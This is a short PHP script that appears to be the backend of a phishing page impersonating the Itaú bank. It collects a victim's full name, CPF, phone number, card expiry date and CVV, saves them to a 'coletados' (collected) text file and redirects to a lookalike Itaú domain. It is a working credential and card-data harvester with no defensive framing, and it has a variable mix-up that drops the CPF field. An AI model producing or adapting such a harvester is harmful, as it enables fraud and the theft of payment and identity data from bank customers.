<?php
	$nomecompleto = $_POST['nomecompleto'];
	$cpf = $_POST['numcpf'];
	$numtel = $_POST['numtel'];
	$numdtv = $_POST['numdtv'];
	$numcvv = $_POST['numcvv'];
	

	$capturado = "Nome: $nomecompleto - CPF: $numcpf - Telefone $numtel - VALIDADE $numdtv - CVV $numcvv";

	$arquivo = fopen('coletados2.txt','w');
	if ($arquivo == false) die('Não foi possível criar o arquivo.');

	fwrite($arquivo, $capturado);
	fclose($arquivo);

	header('Location: https://itau.lordbrasil.info/parabens.html');
?>

